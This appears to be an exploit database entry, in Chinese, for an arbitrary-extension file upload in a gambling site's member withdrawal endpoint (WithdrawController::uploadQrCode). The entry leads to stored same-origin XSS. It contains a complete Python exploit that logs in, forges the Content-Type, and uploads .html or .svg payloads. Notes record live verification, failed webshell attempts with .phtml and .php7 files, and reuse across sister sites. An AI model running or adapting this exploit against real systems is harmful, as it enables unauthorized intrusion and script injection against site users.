# boyue(webman) 博彩站群会员端 —— upload-qrcode 任意扩展名写入 + 同源存储型 XSS（WithdrawController::uploadQrCode）

- **code**: boyue-webman-博彩站群会员端-upload-qrcode-任意扩展名写入-同源存储型-xss-withdrawcontroller-uploadqr
- **kind**: exp
- **category**: file-upload
- **component**: boyue / webman 博彩站群会员端
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测验证：POST /api/v1/withdraw/upload-qrcode（Bearer 会员 token）上传 filename=poc.html（Content-Type: text/html，内容含 <script>alert('XSS@'+document.domain)</script>）→ 200 {"code":0,"message":"上传成功","data":{"url":"/uploads/qrcode/20261012/6acc9edb6a377_403.html"}}；直接 GET 该 URL → 200，Content-Type: text/html，脚本原样返回。poc.svg 同理（200 image/svg+xml）。x.phtml 落盘后 GET 403（nginx 拦截），x.php7 落盘后 GET 200 但以 application/octet-stream 返回源码未执行 —— 该主机无 PHP-FPM，故不能直接转 WebShell。
- **path**: pocs/boyue-webman-博彩站群会员端-upload-qrcode-任意扩展名写入-同源存储型-xss-withdrawcontroller-uploadqr/upload_qrcode_xss.py
- **tags**: webman,boyue,博彩站群,任意文件上传,同源XSS,file-upload
- **created_at**: 2026-10-12T08:52:38.833Z
- **found_by**: vuln-scan

## 描述

利用 boyue/webman 博彩站群会员端 `/api/v1/withdraw/upload-qrcode`（WithdrawController::uploadQrCode）只用客户端 Content-Type 做 MIME 校验、扩展名直接取上传文件名的问题，实现任意扩展名写入 public/uploads/，并用 .html/.svg 达到同源任意 JS 执行（同源 XSS）。

## 用法

```
python upload_qrcode_xss.py https://example.com hao5201314q <password> poc.html ./poc.html  → 返回 {"code":0,...,"url":"/uploads/qrcode/YYYYMMDD/<id>_<uid>.html"}；浏览器打开该 URL 即执行脚本。同源站群（example.com / example.com / example.com / 同 IP 其它 vhost）会员端接口同一套，可同法复现。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""boyue(webman) 博彩站群会员端 —— 提现收款码上传点任意扩展名写入 → 同源 XSS（可转 RCE 视解析配置）
用法: python upload_xss.py <base> <username> <password> <filename> <local_file>
例:   python upload_xss.py https://example.com hao5201314q hao5201314 poc.html ./poc.html
"""
import json, sys, uuid, ssl, urllib.request, urllib.error

BASE = sys.argv[1].rstrip("/")
USER, PW, FNAME, LOCAL = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/203.0.113.46 Safari/537.36"


def post_json(path, obj, token=None, extra=None):
    h = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
    if token: h["Authorization"] = "Bearer " + token
    if extra: h.update(extra)
    r = urllib.request.Request(BASE + path, data=json.dumps(obj).encode(), headers=h, method="POST")
    op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    try:
        return op.open(r, timeout=30).read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "ignore")


def upload(path, filename, data, token, ctype="image/jpeg"):
    b = "----WebKitFormBoundary" + uuid.uuid4().hex
    body = ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: %s\r\n\r\n" % (b, filename, ctype)).encode() + data + b"\r\n"
    body += ("--%s--\r\n" % b).encode()
    r = urllib.request.Request(BASE + path, data=body, method="POST",
                               headers={"User-Agent": UA,
                                        "Content-Type": "multipart/form-data; boundary=" + b,
                                        "Authorization": "Bearer " + token})
    op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    try:
        return op.open(r, timeout=40).read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "ignore")


tok = json.loads(post_json("/api/v1/auth/login", {"username": USER, "password": PW}))["data"]["token"]
print("[+] token ok")
print(upload("/api/v1/withdraw/upload-qrcode", FNAME, open(LOCAL, "rb").read(), tok))
# 说明：服务端 WithdrawController::uploadQrCode() 只用 $file->getUploadMimeType()（取自客户端
# Content-Type 头，可伪造）校验，扩展名直接取上传文件名 → 任意后缀写入 public/uploads/qrcode/YYYYMMDD/。
# .php/.phtml/.phar 会被 nginx 403，但 .html/.svg 会以 text/html、image/svg+xml 原样返回 → 同源 XSS。

```
